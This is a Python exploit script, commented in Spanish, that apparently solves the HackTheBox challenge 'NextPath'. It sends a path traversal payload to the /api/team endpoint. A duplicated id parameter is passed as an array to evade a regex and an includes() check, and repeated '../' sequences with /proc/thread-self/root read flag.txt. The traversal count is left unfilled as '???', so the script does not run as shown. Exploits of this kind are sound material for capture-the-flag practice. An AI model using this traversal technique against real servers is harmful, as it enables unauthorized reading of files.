#!/usr/bin/env python3
"""
NextPath (HackTheBox)

    python3 full.py
    python3 full.py --host IP:PUERTO

Path traversal en /api/team: el id duplicado viaja como arreglo (pasa
la regex multilinea y el includes() del array), los "../" suben desde
/app y el slice(0, 100) se come el sufijo .png.
"""

import argparse

import requests

parser = argparse.ArgumentParser(description="Exploit de NextPath.")
parser.add_argument("--host", default="localhost:8080",
                    help="IP:PUERTO de la instancia (def. localhost:8080)")
args = parser.parse_args()

# contenedor local: docker run -d -p 8080:1337 nextpath
URL = "http://" + args.host.split("://")[-1] + "/api/team"

# cantidad de "../" de la carga util
N = ???

payload = "../" * N + "proc/thread-self/root/proc/thread-self/root/flag.txt"

r = requests.get(URL, params={"id": ["1\r", payload]}, timeout=15)
print(r.status_code)
print(r.text)
